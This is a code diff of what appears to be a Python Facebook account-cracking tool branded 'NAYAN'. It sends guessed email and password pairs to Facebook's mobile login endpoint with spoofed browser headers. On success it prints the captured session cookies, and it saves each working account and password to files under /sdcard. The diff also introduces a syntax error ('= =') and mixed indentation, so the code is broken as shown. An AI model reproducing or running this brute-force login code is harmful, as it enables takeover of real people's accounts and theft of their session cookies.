@@ -224,7 +224,7 @@ def ncrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-			header_freefb = {'authority': 'mbasic.facebook.com',
+			header_freefb = = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -239,22 +239,17 @@ def ncrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5481.223 Safari/537.36',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            
+			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[65:80]
-                print(' \n\033[1;97m[\033[1;92mNAYAN-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m➡️\033[1;91m]\033[1;92m COOKIES \033[1;91m=\033[1;96m '+coki+'')                
-                open('/sdcard/paid-ok.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[65:80]
-                #print('[𝑨𝑳𝑰𝑭-CP] ' +uid+ '|' +ps+ '')
-                open('/sdcard/paid-cp.txt', 'a').write( uid+' | '+ps+'')
-                cps.append(cid)
-                break
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r \033[1;32m[NAYAN-OK💣] q '+cid+ '|' +ps+   '  \n \033[1;34m[COOKIE \033[1;91m[💥] = \033[1;92m'+coki+  ' \n\033[1;95m')
+				cek_apk(session,coki)
+				open('/sdcard/MR.NAYAN-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				oks.append(cid)
+				break
 			else:
 				continue
 		loop+=1
